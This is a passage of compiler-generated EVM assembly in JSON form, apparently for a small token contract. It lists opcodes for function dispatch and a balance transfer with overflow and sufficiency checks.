											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "POP"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "DUP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SUB"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "DUP2"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "ADD"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "DUP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "DUP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "AND"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "ADD"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP3"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP2"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "DUP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "ADD"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP3"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP2"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "SWAP1"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "POP"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "POP"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "POP"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "JUMP"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "JUMPDEST"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "STOP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "JUMPDEST"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "POP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SUB"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP2"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "ADD"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "AND"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "ADD"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP3"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP2"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "POP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "POP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "POP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "JUMP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "JUMPDEST"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "MLOAD"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP3"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP2"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "MSTORE"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "ADD"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP2"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "POP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "POP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "MLOAD"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP2"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SUB"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "RETURN"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "JUMPDEST"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "POP"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SUB"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP2"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "ADD"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "AND"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "ADD"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP3"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP2"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "POP"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "POP"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "POP"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "JUMP"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "JUMPDEST"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "MLOAD"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP3"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "ISZERO"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "ISZERO"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "ISZERO"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "ISZERO"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP2"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "MSTORE"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "ADD"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP2"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "POP"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "POP"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "MLOAD"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP2"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SUB"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "RETURN"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "JUMPDEST"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "JUMP"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "JUMPDEST"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "STOP"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "JUMPDEST"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "POP"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "JUMP"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "JUMPDEST"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "MLOAD"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "DUP1"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "DUP3"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "ISZERO"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "ISZERO"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "ISZERO"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "ISZERO"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "DUP2"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "MSTORE"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "ADD"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "SWAP2"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "POP"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "POP"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "MLOAD"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "DUP1"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "SWAP2"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "SUB"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "SWAP1"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "RETURN"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "JUMPDEST"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "POP"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "JUMP"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "JUMPDEST"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "STOP"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "JUMPDEST"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "POP"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "JUMP"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "JUMPDEST"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "MLOAD"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "DUP1"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "DUP3"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "DUP2"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "MSTORE"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "ADD"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "SWAP2"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "POP"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "POP"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "MLOAD"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "DUP1"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "SWAP2"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "SUB"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "SWAP1"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "RETURN"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "JUMPDEST"
										},
										{
											"begin": 555,
											"end": 573,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 605,
											"end": 619,
											"name": "DUP1"
										},
										{
											"begin": 576,
											"end": 582,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "DUP1"
										},
										{
											"begin": 583,
											"end": 593,
											"name": "CALLER"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "AND"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "AND"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "DUP2"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "MSTORE"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "ADD"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "SWAP1"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "DUP2"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "MSTORE"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "ADD"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "KECCAK256"
										},
										{
											"begin": 576,
											"end": 594,
											"name": "SLOAD"
										},
										{
											"begin": 555,
											"end": 594,
											"name": "SWAP2"
										},
										{
											"begin": 555,
											"end": 594,
											"name": "POP"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "DUP1"
										},
										{
											"begin": 629,
											"end": 631,
											"name": "DUP6"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "AND"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "AND"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "DUP2"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "MSTORE"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "ADD"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "SWAP1"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "DUP2"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "MSTORE"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "ADD"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "KECCAK256"
										},
										{
											"begin": 622,
											"end": 632,
											"name": "SLOAD"
										},
										{
											"begin": 605,
											"end": 632,
											"name": "SWAP1"
										},
										{
											"begin": 605,
											"end": 632,
											"name": "POP"
										},
										{
											"begin": 664,
											"end": 670,
											"name": "DUP3"
										},
										{
											"begin": 651,
											"end": 661,
											"name": "DUP3"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "GT"
										},
										{
											"begin": 643,
											"end": 671,
											"name": "ISZERO"
										},
										{
											"begin": 643,
											"end": 671,
											"name": "ISZERO"
										},
										{
											"begin": 643,
											"end": 671,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 643,
											"end": 671,
											"name": "JUMPI"
										},
										{
											"begin": 643,
											"end": 671,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 643,
											"end": 671,
											"name": "DUP1"
										},
										{
											"begin": 643,
											"end": 671,
											"name": "REVERT"
										},
										{
											"begin": 643,
											"end": 671,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 643,
											"end": 671,
											"name": "JUMPDEST"
										},
										{
											"begin": 708,
											"end": 714,
											"name": "DUP3"
										},
										{
											"begin": 699,
											"end": 705,
											"name": "DUP4"
										},
										{
											"begin": 690,
											"end": 696,
											"name": "DUP3"
										},
										{
											"begin": 690,
											"end": 705,
											"name": "ADD"
										},
										{
											"begin": 690,
											"end": 714,
											"name": "GT"
										},
										{
											"begin": 682,
											"end": 715,
											"name": "ISZERO"
										},
										{
											"begin": 682,
											"end": 715,
											"name": "ISZERO"
										},
										{
											"begin": 682,
											"end": 715,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 682,
											"end": 715,
											"name": "JUMPI"
										},
										{
											"begin": 682,
											"end": 715,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 682,
											"end": 715,
											"name": "DUP1"
										},
										{
											"begin": 682,
											"end": 715,
											"name": "REVERT"
										},
										{
											"begin": 682,
											"end": 715,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 682,
											"end": 715,
											"name": "JUMPDEST"
										},
										{
											"begin": 760,
											"end": 766,
											"name": "DUP3"
										},
										{
											"begin": 747,
											"end": 757,
											"name": "DUP3"
										},
										{
											"begin": 747,
											"end": 766,
											"name": "SUB"
										},
										{
											"begin": 726,
											"end": 732,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 743,
											"name": "CALLER"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "AND"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "AND"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "DUP2"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "MSTORE"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "ADD"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "SWAP1"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "DUP2"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "MSTORE"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "ADD"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 726,
											"end": 744,
											"name": "KECCAK256"
										},
										{
											"begin": 726,
											"end": 766,
											"name": "DUP2"
										},
										{
											"begin": 726,
											"end": 766,
											"name": "SWAP1"
										},
										{
											"begin": 726,
											"end": 766,
											"name": "SSTORE"
										},
										{
											"begin": 726,
											"end": 766,
											"name": "POP"
										},
										{
											"begin": 799,
											"end": 805,
											"name": "DUP3"
										},
										{
											"begin": 790,
											"end": 796,
											"name": "DUP2"
										},
										{
											"begin": 790,
											"end": 805,
											"name": "ADD"
										},
										{
											"begin": 777,
											"end": 783,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "DUP1"
										},
										{
											"begin": 784,
											"end": 786,
											"name": "DUP7"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "AND"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "AND"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "DUP2"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "MSTORE"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "ADD"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "SWAP1"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "DUP2"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "MSTORE"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "ADD"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 777,
											"end": 787,
											"name": "KECCAK256"
										},
										{
											"begin": 777,
											"end": 805,
											"name": "DUP2"
										},
										{
											"begin": 777,
											"end": 805,
											"name": "SWAP1"
										},
										{
											"begin": 777,
											"end": 805,
											"name": "SSTORE"
										},
										{
											"begin": 777,
											"end": 805,
											"name": "POP"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "POP"
										},
										{
											"begin": 485,
